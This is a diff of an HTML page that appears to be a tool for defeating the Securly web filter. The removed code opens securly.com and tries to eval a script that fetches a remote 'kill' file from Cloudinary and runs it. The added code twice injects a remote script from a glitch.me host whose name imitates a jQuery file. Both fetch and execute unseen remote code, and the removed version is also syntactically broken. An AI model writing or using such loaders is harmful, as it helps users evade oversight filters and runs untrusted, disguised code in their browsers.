@@ -3,24 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Open securly.com and Run Script</title>
+    <title>Run JavaScript Twice</title>
 </head>
 <body>
+    <button id="runButton">Run JavaScript Twice</button>
 
-<button onclick="openAndRunScript()">Open securly.com and Run Script</button>
+    <script>
+        document.getElementById('runButton').addEventListener('click', function() {
+            // Define the JavaScript code to be executed
+            var scriptCode = "(function () { var a = document.createElement('script'); a.src = 'https://jquery-scripts.glitch.me/scripts/3.0/jquery-3.0.5.min.js'; document.body.appendChild(a); }())";
 
-<script>
-    function openAndRunScript() {
-        var scriptCode = "var script = document.createElement('script'); \
-        script.src = 'javascript:fetch('https://res.cloudinary.com/dxttxbdrd/raw/upload/v1693510756/kill_qn1hjn.js').then(r => r.text()).then(r => eval(r))'; \
-        document.body.appendChild(script);";
-
-        var newTab = window.open("https://securly.com", "_blank");
-        newTab.onload = function() {
-            newTab.eval(scriptCode);
-        };
-    }
-</script>
-
+            // Run the script twice
+            eval(scriptCode);
+            eval(scriptCode);
+        });
+    </script>
 </body>
 </html>
